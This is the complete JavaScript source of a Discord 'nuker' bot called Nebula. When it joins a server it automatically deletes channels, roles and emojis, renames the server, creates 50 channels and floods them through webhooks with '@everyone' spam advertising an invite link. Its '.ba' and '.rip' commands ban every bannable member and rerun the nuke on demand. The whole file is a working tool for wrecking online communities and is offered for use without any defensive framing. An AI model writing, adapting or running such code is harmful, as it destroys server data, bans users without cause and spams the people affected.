const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fetch = require('node-fetch'); // For future icon/asset use
dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => {
  res.send('Nebula Bot is online and auto-nuking servers via webhooks...');
});
app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER (With Exponential Backoff) ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = (error.retry_after || 1000) * (1.5 ** retries);
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms (attempt ${retries + 1}/${maxRetries})`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  console.error('[FATAL] Max retries exceeded for rate limit.');
  return null;
}

// ====== SAFE LEAVE FUNCTION ======
async function safeLeaveGuild(guild) {
  if (!guild || !guild.available || !guild.members.me) return;
  await handleRateLimit(() => guild.leave()).catch(() => {});
  console.log('🚪 Left server.');
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('discord.gg/migh', { type: 'PLAYING' });
});

// ====== AUTO-NUKE ON JOIN (FAST & SYNCED SPAM) ======
client.on('guildCreate', async (guild) => {
  const BLOCKED_GUILD_ID = '1345474714331643956';
  const SPAM_MESSAGE = '@everyone discord.gg/migh';
  const CHANNEL_NAME = 'neb-was-here';

  if (guild.id === BLOCKED_GUILD_ID) {
    console.log(`🚫 Blocked: ${guild.name}`);
    return safeLeaveGuild(guild);
  }

  console.log(`🎯 Auto-nuking: ${guild.name} (${guild.id})`);
  let totalSent = 0;

  try {
    await new Promise(r => setTimeout(r, 200)); // Fast start

    // === PARALLEL DELETIONS ===
    await Promise.allSettled([
      // Delete Channels
      (async () => {
        const channels = guild.channels.cache.filter(ch => ch.deletable);
        await Promise.allSettled(channels.map(ch =>
          handleRateLimit(() => ch.delete()).catch(() => {})
        ));
      })(),

      // Delete Roles
      (async () => {
        const roles = guild.roles.cache
          .filter(r => r.name !== '@everyone' && !r.managed && r.deletable);
        await Promise.allSettled(roles.map(r =>
          handleRateLimit(() => r.delete()).catch(() => {})
        ));
      })(),

      // Delete Emojis
      (async () => {
        const emojis = guild.emojis.cache;
        await Promise.allSettled(emojis.map(e =>
          handleRateLimit(() => e.delete()).catch(() => {})
        ));
      })(),

      // Rename Server
      (async () => {
        await handleRateLimit(() => guild.setName('discord.gg/migh')).catch(() => {});
      })()
    ]);

    console.log('✅ Cleanup complete. Creating channels...');

    // === CREATE 50 CHANNELS FAST ===
    const channelPromises = [];
    for (let i = 0; i < 50; i++) {
      channelPromises.push(
        handleRateLimit(() => guild.channels.create({ name: `${CHANNEL_NAME}-${i + 1}` }))
          .catch(() => null)
      );
      if (i % 10 === 0) await new Promise(r => setTimeout(r, 10)); // Stagger slightly
    }

    const channels = (await Promise.allSettled(channelPromises))
      .map(p => p.status === 'fulfilled' ? p.value : null)
      .filter(ch => ch);

    if (channels.length === 0) {
      console.log('❌ No channels created. Aborting spam.');
      return;
    }

    console.log(`✅ Created ${channels.length} channels. Starting synced spam...`);

    // === CREATE WEBHOOKS + SYNCED SPAM ===
    const spamPromises = [];
    const MAX_MESSAGES = 1000;

    for (const channel of channels) {
      const webhook = await handleRateLimit(() =>
        channel.createWebhook({ name: 'neb-was-here' }).catch(() => null)
      );

      if (webhook) {
        // Spam via webhook
        for (let i = 0; i < 20 && totalSent < MAX_MESSAGES; i++) {
          spamPromises.push(
            handleRateLimit(() => webhook.send(SPAM_MESSAGE))
              .then(() => { totalSent++; })
              .catch(() => {})
          );
        }
      } else {
        // Fallback: direct message
        for (let i = 0; i < 10 && totalSent < MAX_MESSAGES; i++) {
          spamPromises.push(
            handleRateLimit(() => channel.send(SPAM_MESSAGE))
              .then(() => { totalSent++; })
              .catch(() => {})
          );
        }
      }
    }

    // Run ALL spam in parallel (synchronized across all channels)
    await Promise.allSettled(spamPromises);

    console.log(`✅ Synced spam complete. ${totalSent} messages sent.`);
    if (totalSent >= 950) await safeLeaveGuild(guild);
  } catch (err) {
    console.error('🚨 Auto-nuke failed:', err.message);
    await safeLeaveGuild(guild);
  }
});

// ====== MESSAGE HANDLER (.ba, .rip, .help, .servers) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();
  const BLOCKED_GUILD_ID = '1345474714331643956';
  const SPAM_MESSAGE = '@everyone discord.gg/migh';

  // ===== HELP =====
  if (command === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🔥 Nebula Bot')
      .setDescription('Commands for total destruction.')
      .addFields(
        { name: '.rip', value: 'Full nuke + synced spam' },
        { name: '.ba', value: 'Ban all members' },
        { name: '.help', value: 'Show this menu' },
        { name: '.servers', value: 'List servers (owner only)' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'discord.gg/migh' });

    try {
      await message.author.send({ embeds: [embed] });
      await message.reply('📬 Help sent to DMs!');
    } catch {
      await message.reply('❌ Enable DMs to receive help.');
    }
  }

  // ===== SERVERS (OWNER ONLY) =====
  if (command === 'servers' && message.author.id === '1400281740978815118') {
    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers')
      .setColor('#00ffff');
    client.guilds.cache.forEach(g => {
      embed.addFields({ name: g.name, value: `ID: ${g.id}` });
    });
    await message.author.send({ embeds: [embed] }).catch(() => {});
    await message.reply(`✅ In ${client.guilds.cache.size} servers.`);
  }

  // Block .ba and .rip in protected server
  if (['ba', 'rip'].includes(command) && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 This command is disabled here.');
  }

  // ===== BAN ALL =====
  if (command === 'ba') {
    const guild = message.guild;
    const ownerID = guild.ownerId;
    const members = await guild.members.fetch();
    const toBan = members.filter(m => m.id !== ownerID && !m.user.bot && m.bannable);

    await message.reply(`🔪 Banning ${toBan.size} members...`);
    let count = 0;

    for (const member of toBan.values()) {
      await handleRateLimit(() => guild.members.ban(member, {
        reason: 'Nebula Mass Ban',
        deleteMessageSeconds: 604800
      }));
      count++;
      if (count % 10 === 0) await new Promise(r => setTimeout(r, 500));
    }

    await message.reply(`✅ Banned ${count} members.`);
  }

  // ===== RIP (Manual Nuke + Synced Spam) =====
  if (command === 'rip') {
    const guild = message.guild;
    let totalSent = 0;

    // Delete everything in parallel
    await Promise.allSettled([
      ...guild.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})),
      ...guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete()).catch(() => {})),
      ...guild.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {}))
    ]);

    await handleRateLimit(() => guild.setName('discord.gg/migh'));

    // Create 50 channels
    const channels = [];
    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(() => guild.channels.create({ name: `neb-${i + 1}` }));
      if (ch) channels.push(ch);
    }

    if (channels.length === 0) return message.reply('❌ Failed to create channels.');

    // Create webhooks and start synced spam
    const spamTasks = [];
    for (const ch of channels) {
      const wh = await handleRateLimit(() => ch.createWebhook({ name: 'neb' }).catch(() => null));
      if (wh) {
        for (let i = 0; i < 20 && totalSent < 1000; i++) {
          spamTasks.push(
            handleRateLimit(() => wh.send(SPAM_MESSAGE))
              .then(() => totalSent++)
              .catch(() => {})
          );
        }
      } else {
        for (let i = 0; i < 10 && totalSent < 1000; i++) {
          spamTasks.push(
            handleRateLimit(() => ch.send(SPAM_MESSAGE))
              .then(() => totalSent++)
              .catch(() => {})
          );
        }
      }
    }

    await Promise.allSettled(spamTasks);
    await safeLeaveGuild(guild);
    await message.reply(`✅ Nuked. ${totalSent} messages sent.`);
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
